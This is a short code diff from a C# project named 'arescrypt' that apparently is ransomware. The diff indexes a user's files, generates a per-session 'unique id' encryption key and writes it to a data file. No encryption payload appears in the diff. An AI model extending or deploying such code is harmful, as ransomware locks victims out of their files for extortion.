@@ -11,6 +11,7 @@ namespace arescrypt
         public static string sessionDomain = Environment.UserDomainName; // get current sessions domain
         public static string sessionUsername = Environment.UserName; // get current sessions username
         static Configuration config = new Configuration(); // New instance of Configuration class
+        static Cryptography crypto = new Cryptography(); // New instance of Cryptography class
 
         static void Main(string[] args)
         {
@@ -52,13 +53,17 @@ namespace arescrypt
                 foreach (string file in FileHandler.DirSearch(dir))
                     userSpecificFiles.Add(file);
             fullFileIndex = userSpecificFiles.ToArray();
-
-
+            
             /* BEGIN ENCRYPTION/DECRYPTION SECTION */
-            Cryptography crypto = new Cryptography();
-
             string encKey = crypto.genRandomString(0xC);
+            config.uniqueKey = encKey;
             Console.WriteLine("Generated unique id: " + encKey + "\n");
+
+            Config conf = new Config();
+            conf.uniqueKey = encKey;
+
+            Misc.SetDATFileData(conf);
+            Misc.DisplayDATFileData();
 
             Cryptography.executeExample(); // Execute cryptography example
 
